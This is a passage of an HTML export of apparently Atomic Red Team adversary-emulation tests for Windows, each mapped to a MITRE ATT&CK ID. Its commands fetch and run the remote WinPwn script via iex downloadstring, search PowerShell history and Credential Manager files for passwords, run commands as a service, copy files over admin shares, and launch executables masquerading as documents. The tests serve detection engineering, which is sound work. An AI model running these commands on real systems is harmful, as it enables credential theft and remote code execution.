<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 75f66e03-37d3-4704-9520-3210efbe33ce</li>
<li><strong>name</strong>: WinPwn - powershellsensitive</li>
<li><strong>description</strong>: Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powershellsensitive -consoleoutput -noninteractive</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1552.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 0d4f2281-f720-4572-adc8-d5bb1618affe</li>
<li><strong>name</strong>: List Credential Files via PowerShell</li>
<li>
<p><strong>description</strong>: Via PowerShell,list files where credentials are stored in Windows Credential Manager</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: $usernameinfo = (Get-ChildItem Env:USERNAME).Value
Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Local\Microsoft\Credentials\</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1552.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 2382dee2-a75f-49aa-9378-f52df6ed3fb1</li>
<li><strong>name</strong>: Execute a Command as a Service</li>
<li><strong>description</strong>: Creates a service specifying an arbitrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.</li>
</ul>
<p>Upon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file <code>art-marker.txt</code></p>
<p><a href="https://www.varonis.com/blog/blackcat-ransomware">BlackCat Ransomware (ALPHV)</a><br />
<a href="https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware">Cybereason vs. BlackCat Ransomware</a></p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: sc.exe create #{service_name} binPath= "#{executable_command}"
sc.exe start #{service_name}
sc.exe delete #{service_name}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: del C:\art-marker.txt &gt;nul 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1569.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 6cd715aa-20ac-4be1-a8f1-dda7bae160bd</li>
<li><strong>name</strong>: Enable Local and Remote Symbolic Links via Powershell</li>
<li>
<p><strong>description</strong>: Use Powershell to enable both ‘remote to local’ and ‘remote to remote’ symbolic links. This allows access to files from local shortcuts with local or remote paths.
<a href="https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/">reference</a></p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore
New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 0 -Force -ErrorAction Ignore
New-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\Filesystems\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 0 -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1222</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: f9c3d0ab-479b-4019-945f-22ace2b1731a</li>
<li><strong>name</strong>: Search for Passwords in Powershell History</li>
<li>
<p><strong>description</strong>: Find passwords in the powershell history files
Searching for following strings: "password", "-p", "key", "pwd", "pass"</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: ls -R C:\Users*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | Select-String "password", "-p", "key", "pwd", "pass"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1552</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 7762e120-5879-44ff-97f8-008b401b9a98</li>
<li><strong>name</strong>: Copy a sensitive File over Administrative share with Powershell</li>
<li><strong>description</strong>: Copy from sensitive File from the c$ of another LAN computer with powershell
https://twitter.com/SBousseaden/status/1211636381086339073</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: copy-item -Path "\#{remote}\C$#{share_file}" -Destination "$Env:TEMP#{local_file}"</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "\#{remote}\C$") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Write-Host 'Please Enable "C$" share on #{remote}'</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item -Path "\#{remote}\C$#{share_file}"
Remove-Item -Path "$Env:TEMP#{local_file}"</p>
</li>
<li><strong>mitre_id</strong>: T1039</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: c7fa0c3b-b57f-4cba-9118-863bf4e653fc</li>
<li><strong>name</strong>: File Extension Masquerading</li>
<li><strong>description</strong>: download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched.</li>
</ul>
<p>e.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: copy "#{exe_path}" %temp%\T1036.007_masquerading.docx.exe /Y
copy "#{exe_path}" %temp%\T1036.007_masquerading.pdf.exe /Y
copy "#{exe_path}" %temp%\T1036.007_masquerading.ps1.exe /Y
copy "#{vbs_path}" %temp%\T1036.007_masquerading.xls.vbs /Y
copy "#{vbs_path}" %temp%\T1036.007_masquerading.xlsx.vbs /Y
copy "#{vbs_path}" %temp%\T1036.007_masquerading.png.vbs /Y
copy "#{ps1_path}" %temp%\T1036.007_masquerading.doc.ps1 /Y
copy "#{ps1_path}" %temp%\T1036.007_masquerading.pdf.ps1 /Y
copy "#{ps1_path}" %temp%\T1036.007_masquerading.rtf.ps1 /Y
%temp%\T1036.007_masquerading.docx.exe
%temp%\T1036.007_masquerading.pdf.exe
%temp%\T1036.007_masquerading.ps1.exe
%temp%\T1036.007_masquerading.xls.vbs
%temp%\T1036.007_masquerading.xlsx.vbs
%temp%\T1036.007_masquerading.png.vbs
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path "#{vbs_path}") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory (split-path "#{vbs_path}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036.007/src/T1036.007_masquerading.vbs" -OutFile "#{vbs_path}"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: del /f %temp%\T1036.007_masquerading.docx.exe &gt; nul 2&gt;&amp;1
del /f %temp%\T1036.007_masquerading.pdf.exe &gt; nul 2&gt;&amp;1
del /f %temp%\T1036.007_masquerading.ps1.exe &gt; nul 2&gt;&amp;1
del /f %temp%\T1036.007_masquerading.xls.vbs &gt; nul 2&gt;&amp;1
del /f %temp%\T1036.007_masquerading.xlsx.vbs &gt; nul 2&gt;&amp;1
del /f %temp%\T1036.007_masquerading.png.vbs &gt; nul 2&gt;&amp;1
del /f %temp%\T1036.007_masquerading.doc.ps1 &gt; nul 2&gt;&amp;1
del /f %temp%\T1036.007_masquerading.pdf.ps1 &gt; nul 2&gt;&amp;1
del /f %temp%\T1036.007_masquerading.rtf.ps1 &gt; nul 2&gt;&amp;1</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1036.007</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
